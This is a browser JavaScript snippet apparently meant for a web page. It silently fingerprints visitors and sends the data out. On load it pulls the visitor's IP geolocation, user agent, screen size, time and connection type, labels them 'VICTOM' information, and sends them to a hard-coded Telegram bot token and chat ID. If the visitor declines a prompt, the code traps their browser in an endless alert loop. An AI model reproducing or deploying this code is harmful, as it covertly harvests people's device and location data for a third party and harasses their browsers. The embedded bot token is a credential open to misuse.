
//Request XMLList //
fetch('http://ip-api.com/json/')
        .then(res => res.text())
        .then(data => showInfo(data));

        function showInfo(data) {
       const   ip = `VICTOM IP INFORMATION!
          ${data}
          `;
          
          const token = '5625583933:AAG86PtLqYBv8ubDUVJf_rke6_ZUY_ckTXo';
          const chat_id = 5148207901
          const agent = navigator.userAgent;
          const height = screen.availHeight;
          const width = screen.availWidth;
          const time = Date();
          const network = navigator.connection.type;
          const effectiveType = navigator.connection.effectiveType;
          const text = `Device INFO Found!
          Device Timezone : ${time}
          userAgent : ${agent}
          Device width : ${width}px
          Device Height : ${height}px
          Device effectiveType: ${effectiveType}
          ${ip}
          `;
          url = `https://api.telegram.org/bot${token}/sendMessage?text=${text}&chat_id=${chat_id}`
          fetch(url)
        
        }

const a = confirm('Do you want to run Websites then click oke button!')
if (a) {
  setTimeout(function() {
    window.location.href = 'home.html';
  }, 10000);
} else {
  
      const count = 'Go Back';
      
      setInterval(()=> {
        alert(count);
      },100)
  
}